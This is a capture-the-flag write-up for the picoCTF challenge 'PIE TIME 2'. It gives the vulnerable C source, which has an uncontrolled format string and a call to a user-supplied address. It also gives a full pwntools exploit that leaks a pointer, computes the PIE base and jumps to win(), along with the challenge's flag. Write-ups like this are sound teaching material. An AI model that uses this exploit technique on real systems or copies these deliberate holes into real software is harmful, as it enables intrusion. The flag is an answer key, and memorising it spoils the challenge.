# [Pwn] PIE TIME 2

## 📚 Overview

> *"Can you try to get the flag? I'm not revealing anything anymore!!"*

> *"Hints - What vulnerability can be exploited to leak the address? Please be mindful of the size of pointers in this binary"*

## 💻 Source Code

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void segfault_handler() {
  printf("Segfault Occurred, incorrect address.\n");
  exit(0);
}

void call_functions() {
  char buffer[64];
  printf("Enter your name:");
  fgets(buffer, 64, stdin);
  printf(buffer);

  unsigned long val;
  printf(" enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);

  void (*foo)(void) = (void (*)())val;
  foo();
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  call_functions();
  return 0;
}
```

## ⚙ Full Script

```python
from pwn import *
elf = context.binary = ELF("./vuln", checksec=False)

# p = process('./vuln')
p = remote("rescued-float.picoctf.net", 64527)

p.sendlineafter(b"Enter your name:", b'%p '*20)
leak = p.recvline().strip()
addresses = re.findall(b'0x[0-9a-f]+', leak)

LEAK_ADDR = int(addresses[17], 16)
log.info("Leak address: " + hex(LEAK_ADDR))
BASE_ADDR = LEAK_ADDR - 0x1441
log.info("Base address: " + hex(BASE_ADDR))
WIN_ADDR = BASE_ADDR + elf.symbols.win
log.info("Win address: " + hex(WIN_ADDR))

p.sendlineafter(b"ex => 0x12345: ", hex(WIN_ADDR))
response = p.recvall(timeout=1).strip()
print(response.decode())

p.close()
```

## 🏳 Flag 

`picoCTF{p13_5h0u1dn'7_134k_8c8ae861}`